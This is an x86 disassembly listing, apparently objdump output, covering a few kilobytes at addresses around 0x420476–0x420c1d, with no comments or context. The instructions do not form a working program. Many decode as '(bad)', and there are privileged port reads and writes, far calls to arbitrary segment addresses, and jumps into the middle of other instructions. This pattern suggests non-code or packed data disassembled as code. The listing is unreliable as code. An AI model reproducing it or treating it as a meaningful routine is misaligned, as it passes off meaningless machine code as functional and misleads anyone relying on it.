  420476:	fnstenv [ecx-0x53]
  420479:	fstp   TBYTE PTR [edi-0x4f]
  42047c:	daa    
  42047d:	jne    0x4204b5
  42047f:	lds    ebp,FWORD PTR [eax-0x1df5f201]
  420485:	jns    0x420475
  420487:	nop
  420488:	gs retf 0x6cb2
  42048c:	sub    edx,DWORD PTR [ecx+0x4f]
  42048f:	push   edi
  420490:	test   eax,0x750326a6
  420495:	sbb    BYTE PTR [ecx],bl
  420497:	enter  0xffe5,0xee
  42049b:	inc    edi
  42049c:	jecxz  0x4204fc
  42049e:	cmp    BYTE PTR [ecx+0x57],al
  4204a1:	push   0x65
  4204a3:	stos   BYTE PTR es:[edi],al
  4204a4:	add    eax,0x9fb81c05
  4204a9:	and    DWORD PTR [eax+0x4f],0x43
  4204ad:	stc    
  4204ae:	xor    esi,DWORD PTR [esi-0xf]
  4204b1:	sub    BYTE PTR [edx-0x49],ah
  4204b4:	inc    ecx
  4204b5:	mov    cx,0xbb08
  4204b9:	pop    esp
  4204ba:	sub    eax,0x10fa20d4
  4204bf:	mov    bh,0xfd
  4204c1:	stos   DWORD PTR es:[edi],eax
  4204c2:	daa    
  4204c3:	inc    edi
  4204c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204c5:	cmc    
  4204c6:	pop    es
  4204c7:	cld    
  4204c8:	cli    
  4204c9:	add    ebx,DWORD PTR [eax+eax*4]
  4204cc:	into   
  4204cd:	ficom  DWORD PTR [ebp-0xd]
  4204d0:	cdq    
  4204d1:	add    BYTE PTR [edx],cl
  4204d3:	out    dx,al
  4204d4:	rcl    BYTE PTR ds:0x7d727180,cl
  4204da:	cli    
  4204db:	(bad)
  4204df:	test   al,0xad
  4204e1:	mov    dl,0x63
  4204e3:	or     BYTE PTR [ebx-0x46],dh
  4204e6:	fidivr DWORD PTR [ecx+0x7f]
  4204e9:	mov    DWORD PTR [esi],esi
  4204eb:	into   
  4204ec:	outs   dx,DWORD PTR ss:[esi]
  4204ee:	adc    dh,BYTE PTR [eax-0x6]
  4204f1:	pop    ebp
  4204f2:	jo     0x42052e
  4204f4:	ret    0x7a62
  4204f7:	bound  ecx,QWORD PTR [edx-0x6b]
  4204fa:	sti    
  4204fb:	and    BYTE PTR [ecx+0x1e],dh
  4204fe:	push   ss
  4204ff:	mov    cl,0x62
  420501:	retf   
  420502:	jg     0x420493
  420504:	adc    BYTE PTR [esi-0x3f78ca46],dl
  42050a:	sbb    al,BYTE PTR [esi-0x4d]
  42050d:	xchg   ebx,eax
  42050e:	push   edx
  42050f:	or     BYTE PTR [ecx+0x5994a265],bl
  420515:	ret    0xe82f
  420518:	inc    ebx
  420519:	adc    eax,0xde7dc9fa
  42051e:	in     al,dx
  42051f:	jbe    0x420580
  420521:	and    al,0x3b
  420523:	or     ah,BYTE PTR [ecx+0x5123e6d8]
  420529:	cld    
  42052a:	and    al,0xc1
  42052c:	push   ebx
  42052d:	scas   eax,DWORD PTR es:[edi]
  42052e:	and    eax,0xa2756632
  420533:	dec    edx
  420534:	in     al,0xdc
  420536:	add    al,0x4f
  420538:	scas   al,BYTE PTR es:[edi]
  420539:	in     eax,0xbd
  42053b:	sub    DWORD PTR [edx+0x15],ebx
  42053e:	xchg   ecx,eax
  42053f:	enter  0xd931,0xf4
  420543:	xor    ebp,DWORD PTR [ecx-0x79]
  420546:	push   ss
  420547:	fistp  DWORD PTR [ebp+0x3114fd06]
  42054d:	add    eax,0x2f75d3c2
  420552:	bound  ebp,QWORD PTR [eax]
  420554:	sub    eax,0xdb3fc8ed
  420559:	call   0xf4a4:0x4c947250
  420560:	dec    edx
  420561:	in     al,dx
  420562:	lods   eax,DWORD PTR ds:[esi]
  420563:	jbe    0x420552
  420565:	add    esp,DWORD PTR [esi-0x48]
  420568:	cmp    DWORD PTR [edi+esi*2+0x2e138718],ebx
  42056f:	pop    esi
  420570:	aam    0x6c
  420572:	in     eax,0xb7
  420574:	jg     0x420532
  420576:	stos   BYTE PTR es:[edi],al
  420577:	es cdq 
  420579:	cmp    al,BYTE PTR [edi+0x71beabab]
  42057f:	stos   BYTE PTR es:[edi],al
  420580:	jo     0x42050e
  420582:	cmp    edi,DWORD PTR [edi+0x29]
  420585:	pusha  
  420586:	idiv   DWORD PTR [ebx+0x2]
  420589:	ret    0x8e1e
  42058c:	stc    
  42058d:	bound  ecx,QWORD PTR [ecx+0x1b1afe15]
  420593:	adc    eax,0x1441812d
  420598:	pop    es
  420599:	and    ecx,DWORD PTR [edi+eax*2+0x48e7ef29]
  4205a0:	xor    al,0x2f
  4205a2:	and    ecx,DWORD PTR [edx+esi*1]
  4205a5:	or     DWORD PTR [esi+0x66],esi
  4205a8:	popa   
  4205a9:	mov    ch,0xf6
  4205ab:	and    ah,BYTE PTR [esi+0x6f691099]
  4205b1:	test   eax,0x22aa46a0
  4205b6:	ins    DWORD PTR es:[edi],dx
  4205b7:	test   BYTE PTR [edi+ebx*1+0x6712c2a],bh
  4205be:	push   ds
  4205bf:	popa   
  4205c0:	imul   esp,DWORD PTR [edi],0x8a5970b6
  4205c6:	lds    edi,FWORD PTR [edx+ecx*8-0x4fee9b00]
  4205cd:	enter  0x483,0x3f
  4205d1:	lods   eax,DWORD PTR ds:[esi]
  4205d2:	sbb    al,0xc2
  4205d4:	cmp    BYTE PTR [eax+0x1b],bl
  4205d7:	into   
  4205d8:	push   edi
  4205d9:	outs   dx,BYTE PTR ds:[esi]
  4205da:	jns    0x420609
  4205dc:	adc    al,BYTE PTR [esi+0x9]
  4205df:	dec    edx
  4205e0:	adc    DWORD PTR [esi-0x4d706950],edx
  4205e6:	push   cs
  4205e7:	xchg   DWORD PTR [esi+0x3c],esi
  4205ea:	inc    esp
  4205eb:	inc    ebx
  4205ec:	neg    DWORD PTR [ecx-0x7f]
  4205ef:	mov    edi,0x1a594771
  4205f4:	rcl    DWORD PTR [esi-0x6d88606a],1
  4205fa:	inc    ebp
  4205fb:	sbb    esp,DWORD PTR [ebx]
  4205fd:	pop    eax
  4205fe:	dec    esp
  4205ff:	out    dx,al
  420600:	fldenv [esi+0x64]
  420603:	jb     0x420589
  420605:	inc    edx
  420606:	and    ecx,esp
  420608:	cmp    bl,bl
  42060a:	popf   
  42060b:	push   es
  42060c:	mov    ebp,0xbf7b71fa
  420611:	jecxz  0x4205a5
  420613:	xchg   ebx,eax
  420614:	inc    ebp
  420615:	in     eax,0xc8
  420617:	addr16 mov al,ds:0x37c1
  42061b:	adc    BYTE PTR [esi+esi*4],cl
  42061e:	leave  
  42061f:	sti    
  420620:	xchg   ecx,eax
  420621:	stc    
  420622:	push   edi
  420623:	ds dec ebx
  420625:	sbb    esp,DWORD PTR [ecx+ebp*1]
  420628:	jp     0x42061c
  42062a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42062b:	(bad)
  42062e:	or     eax,0xd2b734c4
  420633:	push   0x89754fd0
  420638:	xchg   esi,eax
  420639:	loop   0x4205d6
  42063b:	mov    ecx,0xe13c33aa
  420640:	xchg   ebx,eax
  420641:	xchg   ecx,eax
  420642:	aas    
  420643:	mov    dl,0xe2
  420645:	xchg   ebp,eax
  420646:	pop    ebx
  420647:	sbb    eax,DWORD PTR [ecx-0x46d22c0d]
  42064d:	mov    al,ds:0x35c36693
  420652:	(bad)  
  420653:	cld    
  420654:	ror    DWORD PTR [edx+0x0],0x50
  420658:	aad    0x43
  42065a:	xchg   esi,eax
  42065b:	push   esi
  42065c:	repz and al,0x6b
  42065f:	loopne 0x4206b3
  420661:	sub    eax,0x91dca7c1
  420666:	mov    edx,0x84b7cf83
  42066b:	mov    esi,0x9ca234d2
  420670:	rol    DWORD PTR [ebx+0x29],1
  420673:	rcl    BYTE PTR [ebx+ecx*2-0x3c],cl
  420677:	in     eax,0xa2
  420679:	mov    dl,BYTE PTR fs:[ecx]
  42067c:	dec    ecx
  42067d:	sti    
  42067e:	out    0x72,eax
  420680:	xor    cl,dh
  420682:	jmp    0x4206d9
  420684:	add    al,0xde
  420686:	daa    
  420687:	pop    ecx
  420688:	mov    eax,ds:0xff6a0bba
  42068d:	sti    
  42068e:	and    DWORD PTR [ebx+eax*4+0x1f52c71b],edx
  420695:	mov    esi,0xf909b406
  42069a:	pop    ebp
  42069b:	and    DWORD PTR [esi-0x566fbd74],ebp
  4206a1:	push   ebp
  4206a2:	cmc    
  4206a3:	ret    0x208e
  4206a6:	mov    ah,0x9b
  4206a8:	mov    dl,0xa5
  4206aa:	pop    ds
  4206ab:	call   0xe7555409
  4206b0:	jae    0x4206af
  4206b2:	ror    DWORD PTR [edx-0x1c21ddaf],cl
  4206b8:	sub    ebp,ebx
  4206ba:	fidivr DWORD PTR [ebx-0x71a83699]
  4206c0:	lahf   
  4206c1:	inc    esp
  4206c2:	loope  0x420694
  4206c4:	icebp  
  4206c5:	jge    0x42064f
  4206c7:	sti    
  4206c8:	pop    ebx
  4206c9:	jecxz  0x42065d
  4206cb:	je     0x4206a7
  4206cd:	cmp    DWORD PTR [ebp+ebp*1-0x3adaf8a7],esp
  4206d4:	fadd   QWORD PTR [esi-0xea12d5a]
  4206da:	fst    QWORD PTR fs:[edi-0x4566f644]
  4206e1:	or     DWORD PTR [edx-0x39054364],edx
  4206e7:	mov    ebp,0xfb8b9c8a
  4206ec:	scas   al,BYTE PTR es:[edi]
  4206ed:	fisttp QWORD PTR [edx+0xd]
  4206f0:	cmp    dl,ah
  4206f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206f3:	sbb    al,0xd1
  4206f5:	or     DWORD PTR [esp+ebx*8-0x150c4c6],edx
  4206fc:	cmp    al,0x52
  4206fe:	inc    ebx
  4206ff:	xor    esp,eax
  420701:	inc    esi
  420702:	add    ebx,DWORD PTR [edx]
  420704:	jl     0x42075b
  420706:	mov    bh,0x1a
  420708:	mov    bh,0x88
  42070a:	and    BYTE PTR [ebx+0x65],cl
  42070d:	mov    dl,0x76
  42070f:	adc    ah,al
  420711:	or     BYTE PTR cs:[edi+0x23],ah
  420715:	les    esp,FWORD PTR [ebx-0x6c6b8af8]
  42071b:	pusha  
  42071c:	(bad)  
  42071d:	in     al,dx
  42071e:	push   edx
  42071f:	fisttp WORD PTR [edi]
  420721:	arpl   WORD PTR [ebx+0x62],sp
  420724:	test   edx,ebp
  420726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420727:	add    al,0xe2
  420729:	popa   
  42072a:	scas   eax,DWORD PTR es:[edi]
  42072b:	sbb    BYTE PTR [ebx-0x44816bb1],dl
  420731:	pop    edx
  420732:	cmc    
  420733:	push   ecx
  420734:	mov    bh,0x9c
  420736:	je     0x420753
  420738:	dec    esi
  420739:	jo     0x4206d0
  42073b:	fstp   DWORD PTR [ebx+ebx*1]
  42073e:	test   DWORD PTR [ebp+0x6c],esi
  420741:	dec    esp
  420742:	sub    BYTE PTR [esi],cl
  420744:	mov    edx,0xbbbafb55
  420749:	arpl   WORD PTR [eax+0x6164ca64],sp
  42074f:	cmc    
  420750:	mov    ch,0x13
  420752:	mov    ecx,0x8ddc5f04
  420757:	je     0x4206ff
  420759:	fistp  WORD PTR [edi]
  42075b:	dec    esp
  42075c:	jl     0x4207a9
  42075e:	es pushf 
  420760:	adc    DWORD PTR [esi],0xabbf87f5
  420766:	and    eax,0xb9d597a9
  42076b:	inc    edx
  42076c:	ins    DWORD PTR es:[edi],dx
  42076d:	pop    edi
  42076e:	push   edx
  42076f:	imul   esi,DWORD PTR [edx],0xffffffc8
  420772:	jo     0x420773
  420774:	xor    ah,BYTE PTR [edi+0x53]
  420777:	and    esi,DWORD PTR [ebx-0x35b12cc2]
  42077d:	test   BYTE PTR [ebx],cl
  42077f:	jg     0x42074a
  420781:	or     ebp,DWORD PTR [eax]
  420783:	cmp    esp,DWORD PTR [ecx+0x77]
  420786:	or     DWORD PTR [esi],ecx
  420788:	sub    DWORD PTR [edi+0x4262e199],edi
  42078e:	sbb    eax,0xbf35581e
  420793:	cmp    esp,esi
  420795:	xor    DWORD PTR [esi-0x3d],edx
  420798:	test   eax,0xf6acaeb5
  42079d:	call   0x9d009189
  4207a2:	shl    edi,cl
  4207a4:	xchg   ebp,eax
  4207a5:	lahf   
  4207a6:	lods   eax,DWORD PTR ds:[esi]
  4207a7:	fldenv [esi+0x3b]
  4207aa:	inc    edi
  4207ab:	retf   
  4207ac:	xchg   DWORD PTR [eax-0x3cb1683d],ebp
  4207b2:	jp     0x420799
  4207b4:	mov    ch,0x2b
  4207b6:	push   ecx
  4207b7:	retf   
  4207b8:	and    DWORD PTR fs:[esi+0x3f],edi
  4207bc:	mov    ecx,0xbf915c7d
  4207c1:	fisub  WORD PTR [ecx]
  4207c3:	sbb    ch,dl
  4207c5:	fxch   st(4)
  4207c7:	sbb    al,ch
  4207c9:	lock push ds
  4207cb:	mov    al,ds:0x60c4e572
  4207d0:	push   ds
  4207d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207d2:	inc    eax
  4207d3:	out    0x77,eax
  4207d5:	xchg   ebx,eax
  4207d6:	and    BYTE PTR [esi],dl
  4207d8:	(bad)  
  4207d9:	ins    BYTE PTR es:[edi],dx
  4207da:	mov    eax,0x26861fea
  4207df:	cmp    eax,0xe495394c
  4207e4:	pop    edx
  4207e5:	mov    BYTE PTR [edx+ecx*8-0x5de25443],dh
  4207ec:	jnp    0x420785
  4207ee:	std    
  4207ef:	mov    gs,WORD PTR [edx+ecx*2]
  4207f2:	lods   al,BYTE PTR ds:[esi]
  4207f3:	div    BYTE PTR [ecx]
  4207f5:	mov    edi,0x2a5e310e
  4207fa:	mov    DWORD PTR [esi+ebx*1],edi
  4207fd:	call   0xcbdc59ad
  420802:	scas   eax,DWORD PTR es:[edi]
  420803:	sub    BYTE PTR [ebp+0x345cc2f],al
  420809:	pop    eax
  42080a:	(bad)  
  42080b:	aaa    
  42080c:	enter  0xa101,0xab
  420810:	shr    edx,1
  420812:	ror    DWORD PTR [edi+0x75],cl
  420815:	push   ebp
  420816:	xlat   BYTE PTR ds:[ebx]
  420817:	mov    cl,0xce
  420819:	ds inc eax
  42081b:	idiv   DWORD PTR [ecx-0xf47fc88]
  420821:	adc    BYTE PTR [eax],ch
  420823:	imul   esp,DWORD PTR [ebx+eax*8+0x17071eba],0x99819fe3
  42082e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42082f:	fldenv [ebp-0x80]
  420832:	mov    ecx,0x411b78c
  420837:	in     al,0x2c
  420839:	xchg   ecx,eax
  42083b:	add    BYTE PTR [ebx],dh
  42083d:	push   ss
  42083e:	cld    
  42083f:	xor    cl,al
  420841:	sub    bh,dh
  420843:	jns    0x42083d
  420845:	jb     0x4208a9
  420847:	mov    edi,0x2f2c21ec
  42084c:	cli    
  42084d:	cwde   
  42084e:	dec    edi
  42084f:	xor    DWORD PTR [ebp+0x1d45103],edi
  420855:	ins    BYTE PTR es:[edi],dx
  420856:	outs   dx,BYTE PTR ds:[esi]
  420857:	fst    QWORD PTR [edi-0x23]
  42085a:	xor    DWORD PTR [edi],eax
  42085c:	xchg   BYTE PTR [ebp-0x1e],dh
  42085f:	xchg   ebx,eax
  420860:	mov    bh,0xeb
  420862:	xor    al,0xd5
  420864:	lods   al,BYTE PTR ds:[esi]
  420865:	sub    ecx,DWORD PTR [bx+si-0x4160]
  42086a:	jle    0x42088f
  42086c:	or     al,0xaf
  42086e:	add    eax,0x21691d4e
  420873:	sub    BYTE PTR [ebp-0x5b9e752],0x99
  42087a:	and    ch,bh
  42087c:	xor    cl,ah
  42087e:	rcl    bh,cl
  420880:	sbb    ecx,DWORD PTR [ecx-0x22]
  420883:	or     cl,cl
  420885:	rcr    BYTE PTR [edx],cl
  420887:	nop
  420888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420889:	sub    eax,DWORD PTR [esi]
  42088b:	jge    0x420876
  42088d:	mov    ecx,0x6f9f660c
  420892:	cwde   
  420893:	xchg   esi,eax
  420894:	jecxz  0x4208ea
  420896:	push   esp
  420897:	sub    eax,0x21525da9
  42089c:	(bad)  
  42089e:	xchg   edx,eax
  42089f:	mov    ds:0x8de09db0,al
  4208a4:	mov    ecx,0xd1dae7c4
  4208a9:	sti    
  4208aa:	xor    al,0x40
  4208ac:	outs   dx,BYTE PTR ds:[esi]
  4208ad:	fistp  QWORD PTR [eax+0x13]
  4208b0:	cmp    DWORD PTR [ebx+0x337f4f5d],0x3d
  4208b7:	inc    edx
  4208b8:	cwde   
  4208b9:	test   DWORD PTR [esi+0x0],0xdc9e77f6
  4208c0:	hlt    
  4208c1:	xchg   BYTE PTR [esi],bl
  4208c3:	xor    esi,DWORD PTR ds:0x3de1c5d0
  4208c9:	mov    DWORD PTR [esp+eax*2-0x52],ecx
  4208cd:	(bad)  
  4208ce:	push   DWORD PTR [ecx+0x49]
  4208d1:	mov    edx,0xb7cc0693
  4208d6:	cld    
  4208d7:	lods   eax,DWORD PTR ds:[esi]
  4208d8:	mov    WORD PTR [esi+ebp*2],?
  4208db:	inc    esi
  4208dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208dd:	cld    
  4208de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208df:	mov    edi,0xd59ca601
  4208e4:	cmp    dh,BYTE PTR [eax-0x22a4d4ac]
  4208ea:	ret    0x3b9e
  4208ed:	pop    ebp
  4208ee:	cdq    
  4208ef:	mov    esp,edi
  4208f1:	aas    
  4208f2:	dec    ebx
  4208f3:	inc    esi
  4208f4:	enter  0xcbea,0x24
  4208f8:	fisub  DWORD PTR [eax+eax*4+0x51]
  4208fc:	mov    eax,cs
  4208fe:	xchg   DWORD PTR [ebp-0x620ebc79],esp
  420904:	fcmovnb st,st(2)
  420906:	fsubr  DWORD PTR [edi-0x3e]
  420909:	in     al,0x88
  42090b:	(bad)  
  42090c:	pop    ds
  42090d:	cmp    ebx,DWORD PTR [ebx+edi*1]
  420910:	xchg   esp,eax
  420911:	rcl    edx,0x10
  420914:	ja     0x4208fe
  420916:	push   ds
  420917:	into   
  420918:	xchg   ecx,eax
  420919:	adc    BYTE PTR [ebx-0x70],al
  42091c:	adc    BYTE PTR [ecx],dl
  42091e:	test   eax,0xb28c1a79
  420923:	mov    bl,0x66
  420925:	(bad)  
  420928:	ror    DWORD PTR [ecx-0x24],cl
  42092b:	and    ch,BYTE PTR [eax+0x31]
  42092e:	scas   al,BYTE PTR es:[edi]
  42092f:	mov    ds:0x12821e5f,al
  420934:	dec    eax
  420935:	(bad)  
  420937:	sub    al,0xe4
  420939:	jnp    0x420971
  42093b:	out    0xef,eax
  42093d:	and    bl,BYTE PTR [edi+0xc]
  420940:	nop
  420941:	inc    esi
  420942:	push   ecx
  420943:	sbb    BYTE PTR [ebx-0x27bbdcfb],0x26
  42094a:	cmp    esi,DWORD PTR [ebp+0x57]
  42094d:	cmp    eax,0xacb3cb92
  420952:	pop    ecx
  420953:	jp     0x420998
  420955:	push   0xfffffff6
  420957:	xchg   edi,eax
  420958:	pop    esp
  420959:	jle    0x4208ee
  42095b:	cmp    ah,cl
  42095d:	pop    eax
  42095e:	xor    ch,BYTE PTR [ebx+0x56]
  420961:	xor    al,0x1b
  420963:	pop    edi
  420964:	fcomip st,st(6)
  420966:	push   ds
  420967:	pop    esi
  420968:	imul   esp,DWORD PTR [edi-0x28eb3e83],0xffffffed
  42096f:	ret    0x93b
  420972:	das    
  420973:	outs   dx,BYTE PTR ds:[esi]
  420974:	or     al,0x36
  420976:	fstp   st(3)
  420978:	mov    ebx,0xc12a8fc5
  42097d:	cwde   
  42097e:	lahf   
  42097f:	(bad)  
  420981:	ins    BYTE PTR es:[edi],dx
  420982:	(bad)  
  420983:	std    
  420984:	mov    dl,0xb6
  420986:	add    edx,DWORD PTR [edi+0x16e1882a]
  42098c:	xor    al,0x87
  42098e:	jnp    0x420981
  420990:	jp     0x420928
  420992:	cmp    BYTE PTR [edx],ah
  420994:	test   dh,ah
  420996:	inc    ecx
  420997:	pushf  
  420998:	daa    
  420999:	lahf   
  42099a:	ret    0xa486
  42099d:	imul   edx,DWORD PTR [ebx],0x840be01d
  4209a3:	push   edx
  4209a4:	sbb    dh,BYTE PTR [esi]
  4209a6:	push   eax
  4209a7:	mov    ebx,0x9ad05693
  4209ac:	call   0x39c7:0xc865aa6e
  4209b3:	sahf   
  4209b4:	jecxz  0x420a1c
  4209b6:	mov    ds:0x3538aab5,eax
  4209bb:	or     DWORD PTR [edi+edi*1-0x6bfef02c],ebp
  4209c2:	inc    ebx
  4209c3:	jno    0x420a1b
  4209c5:	push   ebp
  4209c6:	dec    ebp
  4209c7:	push   0xcf298dfd
  4209cc:	and    cl,al
  4209ce:	adc    edi,ebp
  4209d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209d1:	mov    DWORD PTR ds:0xb6f8dd54,eax
  4209d7:	sub    al,0xd8
  4209d9:	(bad)  
  4209da:	call   0x9c3a0d17
  4209df:	call   0xa371:0xfdcca782
  4209e6:	mov    bl,0x8e
  4209e8:	mov    edx,0xfa9a897f
  4209ed:	cmp    al,0x26
  4209ef:	mov    ds:0x4b39ee47,al
  4209f4:	mov    eax,0x1b069576
  4209f9:	fbstp  TBYTE PTR ds:0xf3e9ad43
  4209ff:	fcom   QWORD PTR [esi]
  420a01:	xchg   esp,eax
  420a02:	add    eax,0x66df4ca1
  420a07:	pop    eax
  420a08:	add    BYTE PTR [ebx+0x14],0xb2
  420a0c:	retf   0xdc40
  420a0f:	(bad)  
  420a10:	sub    ch,ch
  420a12:	and    al,0x4f
  420a14:	mov    dl,0xb2
  420a16:	dec    edx
  420a17:	cmp    al,0x53
  420a19:	stos   DWORD PTR es:[edi],eax
  420a1a:	adc    al,0x58
  420a1c:	and    bh,BYTE PTR [ebp-0x19]
  420a1f:	arpl   bx,bp
  420a21:	cmp    al,0x0
  420a23:	ins    DWORD PTR es:[edi],dx
  420a24:	xor    bl,BYTE PTR [esi]
  420a26:	cli    
  420a27:	lds    esp,FWORD PTR [esi]
  420a29:	and    DWORD PTR [edx],edi
  420a2b:	xchg   esp,eax
  420a2c:	and    BYTE PTR [ebx+edi*8+0x47c30b49],al
  420a33:	cmc    
  420a34:	(bad)  
  420a35:	out    0x7f,al
  420a37:	pusha  
  420a38:	push   edx
  420a39:	inc    esi
  420a3a:	xor    cl,ah
  420a3c:	shr    ebp,cl
  420a3e:	outs   dx,WORD PTR ds:[esi]
  420a40:	int    0xaf
  420a42:	pop    eax
  420a43:	xchg   DWORD PTR [eax-0x6e04857b],edx
  420a49:	aaa    
  420a4a:	mov    edx,DWORD PTR [eax+0x79]
  420a4d:	nop
  420a4e:	mov    edi,0x2cb2f56
  420a53:	mov    es:0x1cda637,al
  420a59:	lock sbb eax,ebx
  420a5c:	xor    edx,DWORD PTR [eax]
  420a5e:	ja     0x420a43
  420a60:	push   0xb548180
  420a65:	je     0x420a53
  420a67:	pop    edx
  420a68:	enter  0xb801,0x32
  420a6c:	push   edi
  420a6d:	dec    edi
  420a6e:	cs jae 0x420aec
  420a71:	test   BYTE PTR [esi+edi*2-0x7f],0x38
  420a76:	test   al,0x14
  420a78:	mov    bh,0x82
  420a7a:	pop    ecx
  420a7b:	pop    esp
  420a7c:	pop    es
  420a7d:	fistp  WORD PTR [esp+eiz*8-0x40]
  420a81:	lods   eax,DWORD PTR ds:[esi]
  420a82:	mov    DWORD PTR [esi+edx*1],edx
  420a85:	repz mov ah,ch
  420a88:	call   0x39c2:0x6b10a3f1
  420a8f:	fisttp DWORD PTR [esi+0x7fceb8cb]
  420a95:	test   BYTE PTR [edi],0x93
  420a98:	nop
  420a99:	inc    eax
  420a9a:	sbb    di,WORD PTR [edx]
  420a9d:	aaa    
  420a9e:	dec    esp
  420a9f:	stos   BYTE PTR es:[edi],al
  420aa0:	jo     0x420a9c
  420aa2:	fmulp  st(1),st
  420aa4:	int3   
  420aa5:	add    eax,0xbd554f42
  420aaa:	(bad)  
  420aab:	out    dx,al
  420aac:	bound  ebx,QWORD PTR [eax]
  420aae:	sub    dl,cl
  420ab0:	test   al,0x51
  420ab2:	pop    esp
  420ab3:	out    0xa8,al
  420ab5:	jle    0x420aff
  420ab7:	int    0x15
  420ab9:	or     bl,0x4e
  420abc:	fnstcw WORD PTR [ecx+ecx*4+0x2a2f910d]
  420ac3:	std    
  420ac4:	ror    ah,1
  420ac6:	stos   BYTE PTR es:[edi],al
  420ac7:	cld    
  420ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ac9:	xchg   ebx,eax
  420aca:	jb     0x420abc
  420acc:	imul   ebx,DWORD PTR [ecx-0x1e],0x25
  420ad0:	daa    
  420ad1:	xchg   DWORD PTR [ecx-0x55],ebx
  420ad4:	repz xchg edx,eax
  420ad6:	test   BYTE PTR cs:[edx+0x36e984aa],ch
  420add:	fst    DWORD PTR [esp+ecx*1+0x34]
  420ae1:	add    al,bl
  420ae3:	jae    0x420abd
  420ae5:	lock mov ecx,0x1d72a890
  420aeb:	mov    ds:0xe2dc3ee,al
  420af0:	push   eax
  420af1:	mov    ebx,0xcb601e18
  420af6:	push   eax
  420af7:	std    
  420af8:	adc    al,0x3b
  420afa:	and    esi,DWORD PTR fs:[ebp-0x3e]
  420afe:	fistp  WORD PTR [edi+0x4c1865d3]
  420b04:	pop    eax
  420b05:	(bad)  [edi]
  420b07:	in     eax,0xd9
  420b09:	xchg   edx,eax
  420b0a:	pop    es
  420b0b:	loopne 0x420b36
  420b0d:	push   edi
  420b0e:	xor    bl,BYTE PTR [ecx]
  420b10:	mov    dh,0xb4
  420b12:	or     edx,eax
  420b14:	jo     0x420abf
  420b16:	test   esi,esi
  420b18:	popa   
  420b19:	shr    BYTE PTR [edx],1
  420b1b:	mov    ss,eax
  420b1d:	dec    ebx
  420b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b1f:	lods   al,BYTE PTR ds:[esi]
  420b20:	ins    DWORD PTR es:[edi],dx
  420b21:	or     DWORD PTR [ebp+0x0],ebp
  420b24:	les    edi,FWORD PTR [ecx-0x1e]
  420b27:	jno    0x420b4d
  420b29:	les    eax,FWORD PTR [eax+0x79]
  420b2c:	in     al,dx
  420b2d:	call   0x658:0x5bef718b
  420b34:	vpaddq ymm4,ymm2,YMMWORD PTR [ebx+0x63]
  420b39:	pop    ebx
  420b3a:	push   0xffffff86
  420b3c:	jb     0x420af2
  420b3e:	dec    esi
  420b3f:	and    al,0x92
  420b41:	xor    eax,0xcccf1c56
  420b46:	mov    BYTE PTR [esi+0x7d5fd69e],ah
  420b4c:	pop    ds
  420b4d:	lock (bad) 
  420b4f:	js     0x420b4c
  420b51:	arpl   WORD PTR [eax-0x66],dx
  420b54:	mov    es,WORD PTR [eax-0x219522d8]
  420b5a:	jl     0x420b12
  420b5c:	mov    cs,WORD PTR [edx]
  420b5e:	jo     0x420b57
  420b60:	jge    0x420b9b
  420b62:	pusha  
  420b63:	ret    
  420b64:	ins    DWORD PTR es:[edi],dx
  420b65:	mov    ah,0x60
  420b67:	sar    BYTE PTR [edi],0xf5
  420b6a:	or     cl,0xae
  420b6d:	stc    
  420b6e:	inc    eax
  420b6f:	or     eax,0x6830d413
  420b74:	sbb    edi,DWORD PTR [ebx-0x45]
  420b77:	retf   
  420b78:	pop    esp
  420b79:	(bad)  
  420b7a:	mov    eax,0x15150bd2
  420b7f:	(bad)  
  420b80:	ins    BYTE PTR es:[edi],dx
  420b81:	popf   
  420b82:	pop    ecx
  420b83:	and    ah,ah
  420b85:	cld    
  420b86:	sub    BYTE PTR [ecx+0x3c],cl
  420b89:	sbb    esi,DWORD PTR [ebp+0x3a]
  420b8c:	jp     0x420b1b
  420b8e:	inc    edx
  420b8f:	rcr    BYTE PTR [ecx+0x58d3feaa],cl
  420b95:	hlt    
  420b96:	cmp    DWORD PTR [ebx+0x6a167f39],0x751f5e9a
  420ba0:	mov    ebp,0xe9188a9b
  420ba5:	inc    edx
  420ba6:	cmp    eax,0x13679a6f
  420bab:	stos   BYTE PTR es:[edi],al
  420bac:	add    eax,0xddbb77e
  420bb1:	mov    eax,0x45331dcf
  420bb6:	xchg   edx,eax
  420bb7:	jecxz  0x420bbd
  420bb9:	inc    esi
  420bba:	loopne 0x420c39
  420bbc:	or     eax,0x94ccbeeb
  420bc1:	(bad)  
  420bc2:	push   ebx
  420bc3:	pop    ss
  420bc4:	popf   
  420bc5:	popa   
  420bc6:	(bad)
  420bc9:	jb     0x420c07
  420bcb:	retf   0xa14f
  420bce:	lods   al,BYTE PTR ds:[esi]
  420bcf:	jl     0x420b87
  420bd1:	jmp    0x2aa2:0x7c15c10d
  420bd8:	bound  edi,QWORD PTR [esi]
  420bda:	gs stos BYTE PTR es:[edi],al
  420bdc:	ds jne 0x420b78
  420bdf:	xchg   edx,eax
  420be0:	push   ds
  420be1:	mov    dl,0xda
  420be3:	mov    ds:0xa32f9637,eax
  420be8:	int3   
  420be9:	leave  
  420bea:	sbb    al,0xf5
  420bec:	push   ecx
  420bed:	pop    ds
  420bee:	mov    ecx,0xdb8062a4
  420bf3:	inc    edi
  420bf4:	mov    edi,0x7060872b
  420bf9:	cmp    edx,DWORD PTR [ebp-0xc]
  420bfc:	pop    ebp
  420bfd:	jns    0x420bec
  420bff:	out    0x6b,eax
  420c01:	mov    ecx,0x365a960a
  420c06:	xor    eax,0xcf460a94
  420c0b:	push   eax
  420c0c:	fstp   st(2)
  420c0e:	sub    ah,ah
  420c10:	popa   
  420c11:	xor    eax,0x77809016
  420c16:	dec    edx
  420c17:	push   ss
  420c18:	cmp    al,0xf1
  420c1a:	and    BYTE PTR [ebp-0x6c],bh
  420c1d:	pusha  
